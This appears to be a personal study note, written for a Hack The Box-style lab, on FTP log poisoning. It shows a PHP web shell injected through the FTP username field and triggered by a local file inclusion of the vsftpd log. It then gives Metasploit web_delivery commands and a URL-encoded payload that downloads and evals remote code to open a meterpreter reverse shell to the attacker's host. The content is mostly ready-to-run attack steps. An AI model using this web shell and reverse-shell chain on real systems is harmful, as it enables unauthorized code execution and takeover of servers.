---
creation date: December 19th 2022
last modified date: December 19th 2022
aliases: []
tags: #📕
---

Primary Categories: { Add link(s) [[]] back to related PRIMARY categories }
Secondary Categories:  { Add link(s) [[]] back to related SECONDARY categories }
Links: {Add link(s) [[]] to related terms}
Search Tag: #📕  

# [[FTP log poisoning]]  
___

## Description:  

Server must be running ftp and have a LFI vuln.
 
Connect to the ftp server and run in the name field:
`'<?php system($_GET['c']); ?>'`

add a &c=command to the end of your URL to run commands:
`http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log&c=ifconfig`

### metasploit shell
Use web delivery to get a shell

```
msfconsole

use exploit/multi/handler

use exploit/multi/script/web_delivery

set target 1

set payload php/meterpreter/reverse_tcp

set uripath /

set srvhost 10.10.14.79

set lhost 10.10.14.79

run
```

Copy and paste the command in msfconsole in your web browser:
`php -d allow_url_fopen=true -r "eval(file_get_contents('http://10.10.14.79:8080/', false, stream_context_create(['ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]])));"`

`http://pikaboo.htb/admin../admin_staging/index.php?page=/var/log/vsftpd.log&c=php%20-d%20allow_url_fopen=true%20-r%20%22eval(file_get_contents(%27http://10.10.14.79:8080/%27,%20false,%20stream_context_create([%27ssl%27=%3E[%27verify_peer%27=%3Efalse,%27verify_peer_name%27=%3Efalse]])));%22`

___

## Resources:

| Hyperlink | Info |
| --------- | ---- |


Created Date: December 19th 2022 (03:02 pm)  
Last Modified Date: <%+tp.file.last_modified_date("MMMM Do YYYY (hh:ss a)")%>
